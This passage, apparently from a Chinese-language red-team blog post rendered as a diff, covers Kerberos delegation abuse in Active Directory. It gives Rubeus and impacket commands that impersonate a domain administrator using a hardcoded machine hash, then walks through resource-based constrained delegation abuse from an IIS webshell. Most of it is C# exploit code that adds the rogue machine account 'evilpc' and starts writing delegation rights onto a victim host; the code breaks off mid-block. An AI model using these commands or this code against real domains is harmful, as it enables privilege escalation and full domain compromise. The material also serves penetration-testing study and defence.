+<p><code>Rubeus.exe s4u /user:win10system$ /rc4:6C4FD556DB12BE51BACD9A3CC19D486E /impersonateuser:administrator /msdsspn:krbtgt /ptt</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/46.png" alt="image"></p>
+<p>klist查看缓存票证</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/47.png" alt="image"></p>
+<p>访问域控</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/48.png" alt="image"></p>
+<p><strong>2.同样的也能用impacket套件</strong></p>
+<pre tabindex="0"><code>
+python3 getST.py -dc-ip 192.168.228.10 -spn krbtgt -impersonate administrator hiro.com/win10system$:win10
+
+set KRB5CCNAME=administrator.ccache
+
+python3 wmiexec.py -no-pass -k administrator@WIN-KONG.hiro.com -dc-ip 192.168.228.10
+</code></pre><h2 id="基于资源的约束委派烂番茄">基于资源的约束委派(烂番茄)</h2>
+<p>基于资源的约束委派通过修改自身msDS-AllowedToActOnBehalfOfOtherIdentity字段达到委派的目的，默认把这台域机器拉入域的域用户有这个权限，还有谁有？</p>
+<p>因为evil这台机器通过07用户拉入域内，通过AdFind遍历evil的ACL，通过write筛选对其具有写权限的用户。</p>
+<p><code>AdFind -b &quot;CN=evil,CN=Computers,DC=redteam,DC=lab&quot; -s base nTSecurityDescriptor -sddl++ -resolvesids | findstr &quot;write”</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/49.png" alt=""></p>
+<p>可以看到不只是07这个用户，SYSTEM权限的用户也对这个对象具有写的权限。</p>
+<h3 id="攻击面通过iis等以服务权限起的域用户拿到当前域机器最高权限">攻击面：通过iis等以服务权限起的域用户拿到当前域机器最高权限。</h3>
+<p>官方文档中(<a href="https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities">https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities</a>)明确表示iis等服务用户以机器账号(SYSTEM)请求网络资源。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/50.png" alt=""></p>
+<p>这样会导致一个非常严重的问题：不止iis，所有低权限服务(例如network service这类型的本机服务)都是以机器账户身份去请求的域内资源。利用这一特性可以直接使其连接到域控的ldap设置基于当前机器的基于资源的约束委派，造成当前域机器沦陷。</p>
+<h2 id="演示">演示</h2>
+<p>前面已知：</p>
+<ol>
+<li>域内用户默认可以创建十台域机器。</li>
+<li>低权限服务(例如network service这类型的本机服务)都是以机器账户身份请求域内资源。</li>
+<li>机器账号对其本身有WriteProperty权限。</li>
+</ol>
+<p>当前环境：</p>
+<ol>
+<li>在域内域机器web2008上存在iis服务，攻击者拿到webshell后发现当前权限为iis，但是此用户依然是域用户，可以创建机器账号；</li>
+<li>iis以机器账户请求域内资源，对其机器本身有WriteProperty权限，可以设置自身的msDS-AllowedToActOnBehalfOfOtherIdentity字段来设置基于资源的约束委派。</li>
+</ol>
+<p>所以可以利用web2008创建域机器（此处为evilpc），并通过writelproperty设置evilpc到其的基于资源的约束委派。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/51.png" alt=""></p>
+<p>通过查看LDAP确定是否设置成功</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/52.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/53.png" alt=""></p>
+<pre tabindex="0"><code>python3 getST.py -dc-ip 192.168.129.130 redteam/evilpc\$:123456 -spn cifs/web2008.redteam.lab -impersonate administrator
+
+export KRB5CCNAME=administrator.ccache
+
+python3 smbexec.py -no-pass -k redteam/administrator@web2008.redteam.lab
+</code></pre><h2 id="exp">EXP</h2>
+<p>ATEAM的demo（链接在下面）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">namespace</span> <span class="n">Addnew_MachineAccount</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">class</span> <span class="n">Program</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="kt">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">DomainController</span> <span class="o">=</span> <span class="s">&#34;192.168.129.130&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">Domain</span> <span class="o">=</span> <span class="s">&#34;redteam.lab&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//String username = args[0]; //域用户名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="c1">//String password = args[1]; //域用户密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">new_MachineAccount</span> <span class="o">=</span> <span class="s">&#34;evilpc&#34;</span><span class="p">;</span> <span class="c1">//添加的机器账户
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">new_MachineAccount_password</span> <span class="o">=</span> <span class="s">&#34;123456&#34;</span><span class="p">;</span> <span class="c1">//机器账户密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">victimcomputer</span> <span class="o">=</span> <span class="s">&#34;web2008&#34;</span><span class="p">;</span> <span class="c1">//需要进行提权的机器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">victimcomputer_ldap_path</span> <span class="o">=</span> <span class="s">&#34;LDAP://CN=web2008,CN=Computers,DC=redteam,DC=lab&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">machine_account</span> <span class="o">=</span> <span class="n">new_MachineAccount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">sam_account</span> <span class="o">=</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34;$&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//machine_account=&#34;evilpc&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="c1">//sam_account=&#34;evilpc$&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">distinguished_name</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">String</span><span class="p">[]</span> <span class="n">DC_array</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">distinguished_name</span> <span class="o">=</span> <span class="s">&#34;CN=&#34;</span> <span class="o">+</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34;,CN=Computers&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//distinguished_name=CN=evilpc,CN=computers;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">DC_array</span> <span class="o">=</span> <span class="n">Domain</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">foreach</span> <span class="p">(</span><span class="n">String</span> <span class="n">DC</span> <span class="n">in</span> <span class="n">DC_array</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">{</span> <span class="c1">//DC=redteam
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//DC=lab
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">          <span class="n">distinguished_name</span> <span class="o">+=</span> <span class="s">&#34;,DC=&#34;</span> <span class="o">+</span> <span class="n">DC</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="c1">//distinguished_name=CN=evilpc,CN=computers,DC=redtram,DC=lab
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Elevate permissions on &#34;</span> <span class="o">+</span> <span class="n">victimcomputer</span><span class="p">);</span> <span class="c1">//[+] Elevate permissions on web2008
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Domain = &#34;</span> <span class="o">+</span> <span class="n">Domain</span><span class="p">);</span> <span class="c1">//[+] Domain = redteam.lab
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Domain Controller = &#34;</span> <span class="o">+</span> <span class="n">DomainController</span><span class="p">);</span> <span class="c1">//[+] Domain Controller = 192.168.129.130
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="c1">//Console.WriteLine](//Console.WriteLine)(&#34;[+] New SAMAccountName = &#34; + sam_account);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="c1">//Console.WriteLine](//Console.WriteLine)(&#34;[+] Distinguished Name = &#34; + distinguished_name);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="c1">//连接ldap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapDirectoryIdentifier</span> <span class="n">identifier</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapDirectoryIdentifier</span><span class="p">(</span><span class="n">DomainController</span><span class="p">,</span> <span class="mi">389</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">connection</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">LdapConnection</span><span class="p">(</span><span class="n">identifier</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//域控不允许在未加密的链接中创建计算机用户&#34;。那么上面给的代码为什么是去连接域控389端口(ldap)而不是去连接636端口(ldaps)创建呢？答案是:ldaps需要配置证书才能使用，在默认环境下就不能正常工作，而ldap只要将Sealing属性设置为ture则可以用sasl加密连接。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">connection</span><span class="p">.</span><span class="n">SessionOptions</span><span class="p">.</span><span class="n">Sealing</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">connection</span><span class="p">.</span><span class="n">SessionOptions</span><span class="p">.</span><span class="n">Signing</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">connection</span><span class="p">.</span><span class="n">Bind</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">var</span> <span class="n">request</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">AddRequest</span><span class="p">(</span><span class="n">distinguished_name</span><span class="p">,</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">[]</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;DnsHostName&#34;</span><span class="p">,</span> <span class="n">machine_account</span> <span class="o">+</span><span class="s">&#34;.&#34;</span><span class="o">+</span> <span class="n">Domain</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;SamAccountName&#34;</span><span class="p">,</span> <span class="n">sam_account</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;userAccountControl&#34;</span><span class="p">,</span> <span class="s">&#34;4096&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;unicodePwd&#34;</span><span class="p">,</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">&#34;</span> <span class="o">+</span> <span class="n">new_MachineAccount_password</span> <span class="o">+</span> <span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;objectClass&#34;</span><span class="p">,</span> <span class="s">&#34;Computer&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">DirectoryAttribute</span><span class="p">(</span><span class="s">&#34;ServicePrincipalName&#34;</span><span class="p">,</span> <span class="s">&#34;HOST/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="o">+</span><span class="s">&#34;.&#34;</span><span class="o">+</span><span class="n">Domain</span><span class="p">,</span><span class="s">&#34;RestrictedKrbHost/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="o">+</span><span class="s">&#34;.&#34;</span><span class="o">+</span><span class="n">Domain</span><span class="p">,</span><span class="s">&#34;HOST/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="p">,</span><span class="s">&#34;RestrictedKrbHost/&#34;</span><span class="o">+</span><span class="n">machine_account</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">try</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//添加机器账户
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="n">connection</span><span class="p">.</span><span class="n">SendRequest</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Machine account: &#34;</span> <span class="o">+</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34; Password: &#34;</span> <span class="o">+</span> <span class="n">new_MachineAccount_password</span> <span class="o">+</span> <span class="s">&#34; added&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">catch</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[-] Exception: &#34;</span> <span class="o">+</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">// 获取新计算机对象的SID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">var</span> <span class="n">new_request</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchRequest</span><span class="p">(</span><span class="n">distinguished_name</span><span class="p">,</span> <span class="s">&#34;(&amp;(samAccountType=805306369)(|(name=&#34;</span> <span class="o">+</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34;)))&#34;</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchScope</span><span class="p">.</span><span class="n">Subtree</span><span class="p">,</span> <span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">var</span> <span class="n">new_response</span> <span class="o">=</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchResponse</span><span class="p">)</span><span class="n">connection</span><span class="p">.</span><span class="n">SendRequest</span><span class="p">(</span><span class="n">new_request</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">SecurityIdentifier</span> <span class="n">sid</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">foreach</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">Protocols</span><span class="p">.</span><span class="n">SearchResultEntry</span> <span class="n">entry</span> <span class="n">in</span> <span class="n">new_response</span><span class="p">.</span><span class="n">Entries</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">try</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="n">sid</span> <span class="o">=</span> <span class="n">new</span> <span class="n">SecurityIdentifier</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">Attributes</span><span class="p">[</span><span class="s">&#34;objectsid&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="n">as</span> <span class="n">byte</span><span class="p">[],</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">Out</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] &#34;</span> <span class="o">+</span> <span class="n">new_MachineAccount</span> <span class="o">+</span> <span class="s">&#34; SID : &#34;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">.</span><span class="n">Value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">catch</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[!] It was not possible to retrieve the SID.</span><span class="se">\n</span><span class="s">Exiting...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//设置资源约束委派
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="n">myldapConnection</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="s">&#34;redteam.lab&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">myldapConnection</span><span class="p">.</span><span class="n">Path</span> <span class="o">=</span> <span class="n">victimcomputer_ldap_path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">myldapConnection</span><span class="p">.</span><span class="n">AuthenticationType</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">AuthenticationTypes</span><span class="p">.</span><span class="n">Secure</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span> <span class="n">search</span> <span class="o">=</span> <span class="n">new</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="n">myldapConnection</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">//通过ldap找计算机
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="n">search</span><span class="p">.</span><span class="n">Filter</span> <span class="o">=</span> <span class="s">&#34;(CN=&#34;</span> <span class="o">+</span> <span class="n">victimcomputer</span> <span class="o">+</span> <span class="s">&#34;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">string</span><span class="p">[]</span> <span class="n">requiredProperties</span> <span class="o">=</span> <span class="n">new</span> <span class="n">string</span><span class="p">[]</span> <span class="p">{</span> <span class="s">&#34;samaccountname&#34;</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">foreach</span> <span class="p">(</span><span class="n">String</span> <span class="n">property</span> <span class="n">in</span> <span class="n">requiredProperties</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">search</span><span class="p">.</span><span class="n">PropertiesToLoad</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">property</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">SearchResult</span> <span class="n">result</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">try</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">search</span><span class="p">.</span><span class="n">FindOne</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">catch</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">ex</span><span class="p">.</span><span class="n">Message</span> <span class="o">+</span> <span class="s">&#34;Exiting...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
